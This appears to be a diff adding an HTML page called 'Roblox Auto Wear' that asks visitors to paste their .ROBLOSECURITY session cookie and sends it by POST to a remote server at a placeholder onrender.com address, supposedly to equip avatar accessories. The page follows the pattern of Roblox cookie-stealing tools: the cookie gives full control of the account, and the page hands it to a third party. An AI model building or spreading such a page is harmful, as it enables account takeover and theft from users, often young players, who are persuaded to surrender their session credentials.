@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Roblox Auto Wear</title>
+  <style>
+    body {
+      background-color: #0d1117;
+      color: #58a6ff;
+      font-family: Arial, sans-serif;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+    }
+    input, button {
+      padding: 10px;
+      margin: 10px;
+      background-color: #161b22;
+      border: 1px solid #30363d;
+      color: #c9d1d9;
+      width: 300px;
+    }
+    button:hover {
+      background-color: #21262d;
+      cursor: pointer;
+    }
+    .success {
+      color: #3fb950;
+      font-weight: bold;
+    }
+    .error {
+      color: #f85149;
+      font-weight: bold;
+    }
+  </style>
+</head>
+<body>
+  <h1>Roblox Auto Wear</h1>
+  <input id="cookie" type="text" placeholder="Enter .ROBLOSECURITY cookie" />
+  <button onclick="autoWear()">Auto Wear</button>
+  <p id="status"></p>
+
+  <script>
+    async function autoWear() {
+      const cookie = document.getElementById('cookie').value;
+      const status = document.getElementById('status');
+      status.textContent = 'Trying to equip accessories...';
+      status.className = '';
+
+      try {
+        const response = await fetch('https://YOUR-RENDER-URL.onrender.com/autowear', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({ roblosecurity: cookie })
+        });
+
+        const result = await response.json();
+
+        if (result.success) {
+          status.textContent = 'Accessories equipped successfully!';
+          status.className = 'success';
+        } else {
+          status.textContent = 'Error: ' + result.error;
+          status.className = 'error';
+        }
+      } catch (err) {
+        status.textContent = 'Request failed: ' + err.message;
+        status.className = 'error';
+      }
+    }
+  </script>
+</body>
+</html>
